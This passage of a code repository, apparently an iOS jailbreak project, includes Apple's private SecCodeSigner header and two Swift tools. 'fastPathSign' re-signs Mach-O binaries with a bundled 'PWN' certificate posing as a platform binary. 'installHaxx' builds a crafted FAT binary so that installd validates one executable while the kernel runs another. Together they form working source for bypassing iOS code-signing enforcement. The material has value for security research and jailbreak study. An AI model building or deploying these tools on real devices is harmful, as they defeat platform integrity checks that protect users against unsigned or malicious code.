		If the value is kCFNull, the signature is written to the system-wide detached
		signature database. (You must have root privileges to write there.)
		If the value of this key is a CFURL, the signature is written to a file at that location,
		replacing any data there.
		If the value is a CFMutableData, the signature is appended to that data.
	@constant kSecCodeSignerDryRun A boolean value. If present and true, the actual writing
		of the signature is inhibited, and the code is not modified, but all operations
		leading up to this are performed normally, including the cryptographic access to
		the signing identity (if any).
	@constant kSecCodeSignerFlags A CFNumber specifying which flags to set in the code signature.
		Note that depending on circumstances, this value may be augmented or modified
		as part of the signing operation.
	@constant kSecCodeSignerIdentifier If present, a CFString that explicitly specifies
		the unique identifier string sealed into the code signature. If absent, the identifier
		is derived implicitly from the code being signed.
	@constant kSecCodeSignerIdentifierPrefix If the unique identifier string of the code signature
		is implicitly generated, and the resulting string does not contain any "." (dot)
		characters, then the (string) value of this parameter is prepended to the identifier.
		By convention, the prefix is usually of the form "com.yourcompany.", but any value
		is acceptable. If the kSecCodeSignerIdentifier parameter is specified, this parameter
		is ineffective (but still allowed).
	@constant kSecCodeSignerIdentity A SecIdentityRef describing the signing identity
		to use for signing code. This is a mandatory parameter for signing operations.
		Its value must be either a SecIdentityRef specifying a cryptographic identity
		valid for Code Signing, or the special value kCFNull to indicate ad-hoc signing.
	@constant kSecCodeSignerOperation The type of operation to be performed. Valid values
		are kSecCodeSignerOperationSign to sign code, and kSecCodeSignerOperationRemove
		to remove any existing signature from code. The default operation is to sign code.
	@constant kSecCodeSignerPageSize An integer value explicitly specifying the page size
		used to sign the main executable. This must be a power of two. A value of zero indicates
		infinite size (no paging).
		Only certain page sizes are allowed in most circumstances, and specifying an inappropriate
		size will lead to spurious verification failures. This is for expert use only.
	@constant kSecCodeSignerRequirements Specifies the internal requirements to be sealed into
		the code signature. Must be either a CFData containing the binary (compiled) form of
		a requirements set (SuperBlob), or a CFString containing a valid text form to be
		compiled into binary form. Default requirements are automatically generated if this
		parameter is omitted, and defaults may be applied to particular requirement types
		that are not specified; but any requirement type you specify is sealed exactly as
		specified.
	@constant kSecCodeSignerResourceRules A CFDictionary containing resource scanning rules
		determining what resource files are sealed into the signature (and in what way).
		A situation-dependent default is applied if this parameter is not specified.
	@constant kSecCodeSignerSDKRoot A CFURLRef indicating an alterate directory root
		where signing operations should find subcomponents (libraries, frameworks, modules, etc.).
		The default is the host system root "/".
	@constant kSecCodeSignerSigningTime Specifies what date and time is sealed into the
		code signature's CMS data. Can be either a CFDate object specifying a date, or
		the value kCFNull indicating that no date should be included in the signature.
		If not specified, the current date is chosen and sealed.
		Since an ad-hoc signature has no CMS data, this argument is ineffective
		for ad-hoc signing operations.
	@constant kSecCodeSignerRequireTimestamp A CFBoolean indicating (if kCFBooleanTrue) that
		the code signature should be certified by a timestamp authority service. This option
		requires access to a timestamp server (usually over the Internet). If requested and
		the timestamp server cannot be contacted or refuses service, the signing operation fails.
		The timestamp value is not under the caller's control.
		If the value is kCFBooleanFalse, no timestamp service is contacted and the resulting signature
		has no certified timestamp.
		If this key is omitted, a default is used that may vary from release to release.
		Note that when signing multi-architectural ("fat") programs, each architecture will
		be signed separately, and thus each architecture will have a slightly different timestamp.
	@constant kSecCodeSignerTimestampServer A CFURL specifying which timestamp authority service
		to contact for timestamping if requested by the kSecCodeSignerRequireTimestamp argument.
		If omitted (and timestamping is performed), a system-defined default value is used, referring
		to an Apple-operated timestamp service. Note that this service may not freely serve all requests.
	@constant kSecCodeSignerTimestampAuthentication A SecIdentityRef describing the identity
        used to authenticate to the timestamp authority server, if the server requires client-side
		(SSL/TLS) authentication. This will not generally be the identity used to sign the actual
		code, depending on the requirements of the timestamp authority service used.
		If omitted, the timestamp server is contacted using unauthenticated HTTP requests.
	@constant kSecCodeSignerTimestampOmitCertificates A CFBoolean indicating (if kCFBooleanTrue)
		that the timestamp embedded in the signature, if requested, not contain the full certificate chain
		of the timestamp service used. This will make for a marginally smaller signature, but may not
		verify correctly unless all such certificates are available (through the keychain system)
		on the verifying system.
		The default is to embed enough certificates to ensure proper verification of Apple-generated
		timestamp signatures.
	@constant kSecCodeSignerRuntimeVersion A CFString indicating the version of runtime hardening policies
		that the process should be opted into. The string should be of the form "x", "x.x", or "x.x.x" where
		x is a number between 0 and 255. This parameter is optional. If the signer specifies
		kSecCodeSignatureRuntime but does not provide this parameter, the runtime version will be the SDK
		version built into the Mach-O.

 */
extern const CFStringRef kSecCodeSignerApplicationData;
extern const CFStringRef kSecCodeSignerDetached;
extern const CFStringRef kSecCodeSignerDigestAlgorithm;
extern const CFStringRef kSecCodeSignerDryRun;
extern const CFStringRef kSecCodeSignerEntitlements;
extern const CFStringRef kSecCodeSignerFlags;
extern const CFStringRef kSecCodeSignerIdentifier;
extern const CFStringRef kSecCodeSignerIdentifierPrefix;
extern const CFStringRef kSecCodeSignerIdentity;
extern const CFStringRef kSecCodeSignerPageSize;
extern const CFStringRef kSecCodeSignerRequirements;
extern const CFStringRef kSecCodeSignerResourceRules;
extern const CFStringRef kSecCodeSignerSDKRoot;
extern const CFStringRef kSecCodeSignerSigningTime;
extern const CFStringRef kSecCodeSignerTimestampAuthentication;
extern const CFStringRef kSecCodeSignerRequireTimestamp;
extern const CFStringRef kSecCodeSignerTimestampServer;
extern const CFStringRef kSecCodeSignerTimestampOmitCertificates;
extern const CFStringRef kSecCodeSignerPreserveMetadata;
extern const CFStringRef kSecCodeSignerTeamIdentifier;
extern const CFStringRef kSecCodeSignerPlatformIdentifier;
extern const CFStringRef kSecCodeSignerRuntimeVersion;
extern const CFStringRef kSecCodeSignerPreserveAFSC;
extern const CFStringRef kSecCodeSignerOmitAdhocFlag;
extern const CFStringRef kSecCodeSignerEditCpuType;
extern const CFStringRef kSecCodeSignerEditCpuSubtype;
extern const CFStringRef kSecCodeSignerEditCMS;

enum {
    kSecCodeSignerPreserveIdentifier = 1 << 0,		// preserve signing identifier
    kSecCodeSignerPreserveRequirements = 1 << 1,	// preserve internal requirements (including DR)
    kSecCodeSignerPreserveEntitlements = 1 << 2,	// preserve entitlements
    kSecCodeSignerPreserveResourceRules = 1 << 3,	// preserve resource rules (and thus resources)
    kSecCodeSignerPreserveFlags = 1 << 4,			// preserve signing flags
	kSecCodeSignerPreserveTeamIdentifier = 1 << 5,  // preserve team identifier flags
	kSecCodeSignerPreserveDigestAlgorithm = 1 << 6, // preserve digest algorithms used
	kSecCodeSignerPreservePEH = 1 << 7,				// preserve pre-encryption hashes
	kSecCodeSignerPreserveRuntime = 1 << 8,        // preserve the runtime version
};


/*!
	@function SecCodeSignerCreate
	Create a (new) SecCodeSigner object to be used for signing code.

	@param parameters An optional CFDictionary containing parameters that influence
		signing operations with the newly created SecCodeSigner. If NULL, defaults
		are applied to all parameters; note however that some parameters do not have
		useful defaults, and will need to be set before signing is attempted.
	@param flags Optional flags. Pass kSecCSDefaultFlags for standard behavior.
		The kSecCSRemoveSignature flag requests that any existing signature be stripped
		from the target code instead of signing. The kSecCSEditSignature flag
        requests editing of existing signatures, which only works with a very
        limited set of options.
	@param staticCode On successful return, a SecStaticCode object reference representing
	the file system origin of the given SecCode. On error, unchanged.
	@result Upon success, errSecSuccess. Upon error, an OSStatus value documented in
	CSCommon.h or certain other Security framework headers.
*/
enum {
	kSecCSRemoveSignature = 1 << 0,		// strip existing signature
	kSecCSSignPreserveSignature = 1 << 1, // do not (re)sign if an embedded signature is already present
	kSecCSSignNestedCode = 1 << 2,		// recursive (deep) signing
	kSecCSSignOpaque = 1 << 3,			// treat all files as resources (no nest scan, no flexibility)
	kSecCSSignV1 = 1 << 4,				// sign ONLY in V1 form
	kSecCSSignNoV1 = 1 << 5,			// do not include V1 form
	kSecCSSignBundleRoot = 1 << 6,		// include files in bundle root
	kSecCSSignStrictPreflight = 1 << 7, // fail signing operation if signature would fail strict validation
	kSecCSSignGeneratePEH = 1 << 8,		// generate pre-encryption hashes
    kSecCSSignGenerateEntitlementDER = 1 << 9, // generate entitlement DER
    kSecCSEditSignature = 1 << 10,      // edit existing signature
};

#ifdef BRIDGED_SECCODESIGNER
OSStatus SecCodeSignerCreate(CFDictionaryRef parameters, SecCSFlags flags,
	SecCodeSignerRef * __nonnull CF_RETURNS_RETAINED signer);
#else
OSStatus SecCodeSignerCreate(CFDictionaryRef parameters, SecCSFlags flags,
	SecCodeSignerRef *signer);
#endif

/*!
	@function SecCodeSignerAddSignature
	Create a code signature and add it to the StaticCode object being signed.

	@param signer A SecCodeSigner object containing all the information required
	to sign code.
	@param code A valid SecStaticCode object reference representing code files
	on disk. This code will be signed, and will ordinarily be modified to contain
	the resulting signature data.
	@param flags Optional flags. Pass kSecCSDefaultFlags for standard behavior.
	@param errors An optional pointer to a CFErrorRef variable. If the call fails
	(and something other than errSecSuccess is returned), and this argument is non-NULL,
	a CFErrorRef is stored there further describing the nature and circumstances
	of the failure. The caller must CFRelease() this error object when done with it.
	@result Upon success, errSecSuccess. Upon error, an OSStatus value documented in
	CSCommon.h or certain other Security framework headers.
*/
OSStatus SecCodeSignerAddSignature(SecCodeSignerRef signer,
	SecStaticCodeRef code, SecCSFlags flags);
	
OSStatus SecCodeSignerAddSignatureWithErrors(SecCodeSignerRef signer,
	SecStaticCodeRef code, SecCSFlags flags, CFErrorRef *errors);


#ifdef __cplusplus
}
#endif

#endif //_H_SECCODESIGNER

```

`Tools/fastPathSign/Sources/Security_Codesign/module.modulemap`:

```modulemap
module Security_Codesign [system] {
    header "SecCodeSigner.h"
}

```

`Tools/fastPathSign/Sources/fastPathSign/main.swift`:

```swift
//
//  main.swift
//  fastPathSign
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

import Foundation
import Security
import Security_Codesign

if CommandLine.arguments.count < 2 {
    print("Usage: fastPathSign <MachO path> <optional team identifier>")
    exit(-1)
}

let path = CommandLine.arguments[1]

var teamID = "Pinauten"
if CommandLine.arguments.count >= 3 {
    teamID = CommandLine.arguments[2]
}

var staticCode: SecStaticCode!
var err = SecStaticCodeCreateWithPath(URL(fileURLWithPath: path) as CFURL, [], &staticCode)
guard err == kOSReturnSuccess,
      staticCode != nil else {
    print("SecStaticCodeCreateWithPath failed!")
    exit(-1)
}

var props: CFDictionary!
err = SecCodeCopySigningInformation(staticCode, [], &props)
guard err == kOSReturnSuccess,
      props != nil else {
    print("SecCodeCopySigningInformation failed!")
    exit(-1)
}

guard let sProps = props as? [String: Any] else {
    print("SecCodeCopySigningInformation returned bad props!")
    exit(-1)
}

var identityCF: CFTypeRef?
err = SecItemCopyMatching([kSecMatchLimit: kSecMatchLimitAll, kSecClass: kSecClassIdentity, kSecReturnRef: true] as CFDictionary, &identityCF)
guard err == kOSReturnSuccess,
      identityCF != nil else {
    print("SecItemCopyMatching failed!!")
    exit(-1)
}

guard CFGetTypeID(identityCF) == CFArrayGetTypeID() else {
    print("SecItemCopyMatching returned bad data!")
    exit(-1)
}

let identities = identityCF as! CFArray as [AnyObject]
guard identities.count != 0 else {
    print("SecItemCopyMatching returned empty array!")
    print("Make sure to import Exploits/fastPath/arm.pfx!")
    exit(-1)
}

var identity: SecIdentity!
for id in identities {
    guard CFGetTypeID(id) == SecIdentityGetTypeID() else {
        continue
    }
    
    var cert: SecCertificate?
    var name: CFString?
    SecIdentityCopyCertificate(id as! SecIdentity, &cert)
    guard cert != nil else {
        continue
    }
    
    SecCertificateCopyCommonName(cert.unsafelyUnwrapped, &name)
    guard name != nil else {
        continue
    }
    
    if String(name.unsafelyUnwrapped) == "Pinauten PWN Cert" {
        identity = (id as! SecIdentity)
        break
    }
}

guard let identity = identity else {
    print("Couldn't find identity!")
    print("Make sure to import Exploits/fastPath/arm.pfx!")
    exit(-1)
}

var signerProps = [
    kSecCodeSignerIdentity!: identity,
    kSecCodeSignerPlatformIdentifier!: 13,
    kSecCodeSignerTeamIdentifier!: teamID
] as [CFString: Any]

func copyIfPossible(_ name: CFString, as: CFString) {
    if let value = sProps[name as String] {
        signerProps[`as`] = value
    }
}

copyIfPossible(kSecCodeInfoRequirementData, as: kSecCodeSignerRequirements)
copyIfPossible(kSecCodeInfoEntitlements, as: kSecCodeSignerEntitlements)
copyIfPossible(kSecCodeInfoIdentifier, as: kSecCodeSignerIdentifier)
copyIfPossible(kSecCodeInfoResourceDirectory, as: kSecCodeSignerResourceRules)

var signer: SecCodeSignerRef?
err = SecCodeSignerCreate(signerProps as CFDictionary, [], &signer)
guard err == kOSReturnSuccess,
      signer != nil else {
    print("SecCodeSignerCreate failed!")
    exit(-1)
}

// Now sign
var cfError: Unmanaged<CFError>?
err = SecCodeSignerAddSignatureWithErrors(signer, staticCode, [], &cfError)
guard err == kOSReturnSuccess else {
    print("SecCodeSignerAddSignatureWithErrors failed!")
    if cfError != nil {
        print(cfError!.takeRetainedValue().localizedDescription)
    } else {
        print("<no error description>")
    }
    exit(-1)
}

```

`Tools/installHaxx/Makefile`:

```
TARGET=installHaxx
CONFIG=release

include ../Makefile.inc

```

`Tools/installHaxx/Package.resolved`:

```resolved
{
  "object": {
    "pins": [
      {
        "package": "SwiftMachO",
        "repositoryURL": "https://github.com/pinauten/SwiftMachO",
        "state": {
          "branch": "master",
          "revision": "d433b349d7e69bb8fd5d18ea5cdbcd8b731ddf55",
          "version": null
        }
      },
      {
        "package": "SwiftUtils",
        "repositoryURL": "https://github.com/pinauten/SwiftUtils",
        "state": {
          "branch": "master",
          "revision": "1d37faabb4c58b3152394c9b6e1c1a68507646b9",
          "version": null
        }
      }
    ]
  },
  "version": 1
}

```

`Tools/installHaxx/Package.swift`:

```swift
// swift-tools-version:5.4
// The swift-tools-version declares the minimum version of Swift required to build this package.

import PackageDescription

let package = Package(
    name: "installHaxx",
    platforms: [
        .iOS(.v14),
        .macOS(.v11)
    ],
    products: [
        // Products define the executables and libraries a package produces, and make them visible to other packages.
        .executable(
            name: "installHaxx",
            targets: ["installHaxx"]),
    ],
    dependencies: [
        // Dependencies declare other packages that this package depends on.
        .package(name: "SwiftUtils", url: "https://github.com/pinauten/SwiftUtils", .branch("master")),
        .package(name: "SwiftMachO", url: "https://github.com/pinauten/SwiftMachO", .branch("master"))
    ],
    targets: [
        // Targets are the basic building blocks of a package. A target can define a module or a test suite.
        // Targets can depend on other targets in this package, and on products in packages this package depends on.
        .executableTarget(
            name: "installHaxx",
            dependencies: ["SwiftUtils", "SwiftMachO"]),
    ]
)

```

`Tools/installHaxx/README.md`:

```md
# installHaxx

Tool to combine two MachO's. When installing an iOS App containing an executable created by this tool, installd will validate the first MachO while the kernel will execute the second one.

```

`Tools/installHaxx/Sources/installHaxx/main.swift`:

```swift
//
//  main.swift
//  installHaxx
//
//  Created by Linus Henze.
//  Copyright © 2021/2022 Pinauten GmbH. All rights reserved.
//

import Foundation
import SwiftUtils
import SwiftMachO

let cpuTypeModify = UInt32(bitPattern: CPU_TYPE_ARM64)
let cpuTypeInject = UInt32(bitPattern: CPU_TYPE_ARM64)

let cpuSubtypeModify = UInt32(bitPattern: CPU_SUBTYPE_ARM64E)
let cpuSubtypeInject = UInt32(bitPattern: CPU_SUBTYPE_ARM64_V8)

do {
    if CommandLine.arguments.count < 4 {
        print("Usage: installHaxx <program to modify> <program to inject> <output> <optional extra data>")
        print("Specify - for one of the input files to read it from stdin")
        print("Specify - for the the output file to write it to stdout")
        exit(-1)
    }
    
    guard CommandLine.arguments[1] != "-" || CommandLine.arguments[2] != "-" else {
        print("You can only specify - for one of the input files!")
        exit(-1)
    }
    
    var modify: Data!
    if CommandLine.arguments[1] != "-" {
        modify = try Data(contentsOf: URL(fileURLWithPath: CommandLine.arguments[1]))
    } else {
        // Read from stdin
        modify = Data()
        
        var chr = getc(stdin)
        while chr != EOF {
            modify.append(UInt8(chr))
            
            chr = getc(stdin)
        }
    }
    
    var inject: Data!
    if CommandLine.arguments[2] != "-" {
        inject = try Data(contentsOf: URL(fileURLWithPath: CommandLine.arguments[2]))
    } else {
        // Read from stdin
        inject = Data()
        
        var chr = getc(stdin)
        while chr != EOF {
            inject.append(UInt8(chr))
            
            chr = getc(stdin)
        }
    }
    
    var extraData: Data!
    if CommandLine.arguments.count >= 5 {
        extraData = try Data(contentsOf: URL(fileURLWithPath: CommandLine.arguments[4]))
    } else {
        extraData = Data()
    }
    
    // Parse as MachO
    let injectMachO = try MachO(fromData: inject, okToLoadFAT: false)
    
    // In our fat, the program we modify has to come first
    // It must be set as an arm64e application in the FAT header
    // It's subtype must be 2, which is invalid
    
    // The program we inject has to come afterwards
    // It must be an arm64e application
    
    guard injectMachO.cpuType == CPU_TYPE_ARM64 else {
        print("The program to inject is not an arm64e application!")
        exit(-1)
    }
    
    guard injectMachO.cpuSubType == cpuSubtypeInject else {
        print("The program to inject is not an arm64e application!")
        exit(-1)
    }
    
    // Ok, build the FAT
    // Header
    var fat = Data(fromObject: FAT_MAGIC.bigEndian)   // FAT magic
    fat.appendGeneric(value: (2 as UInt32).bigEndian) // Number of archs
    
    // Arch 0, the program we modify
    fat.appendGeneric(value: cpuTypeModify.bigEndian)        // CPU Type
    fat.appendGeneric(value: cpuSubtypeModify.bigEndian)     // CPU Subtype
    fat.appendGeneric(value: (0x4000 as UInt32).bigEndian)   // Offset, page-aligned
    fat.appendGeneric(value: UInt32(modify.count).bigEndian) // Size
    fat.appendGeneric(value: (0xE as UInt32).bigEndian)      // Alignment, power of 2
    
    var modifyAlignedSize = UInt32(modify.count)
    if (modifyAlignedSize % 0x4000) != 0 {
        let off = 0x4000 - (modifyAlignedSize & 0x3FFF)
        modifyAlignedSize += off
        modify.append(Data(count: Int(off)))
    }
    
    // Arch 1, the program we inject
    fat.appendGeneric(value: cpuTypeInject.bigEndian)                // CPU Type
    fat.appendGeneric(value: cpuSubtypeInject.bigEndian)             // CPU Subtype
    fat.appendGeneric(value: (0x4000 + modifyAlignedSize).bigEndian) // Offset, page-aligned
    fat.appendGeneric(value: UInt32(inject.count).bigEndian)         // Size
    fat.appendGeneric(value: (0xE as UInt32).bigEndian)              // Alignment, power of 2
    
    // Alignment, fill with zeros
    fat.append(Data(count: 0x4000 - fat.count))
    
    // Append binaries
    fat.append(modify)
    fat.append(inject)
    
    // Extra data comes right after the injected executable
    // No padding
    fat.append(extraData)
    
    // Return that stuff
    if CommandLine.arguments[3] != "-" {
        try fat.write(to: URL(fileURLWithPath: CommandLine.arguments[3]))
    } else {
        // Write to stdout
        fat.withUnsafeBytes { ptr in
            _ = fwrite(ptr.baseAddress!, 1, ptr.count, stdout)
        }
    }
} catch let e {
    print("An exception occurred: \(e)")
    exit(-1)
}

```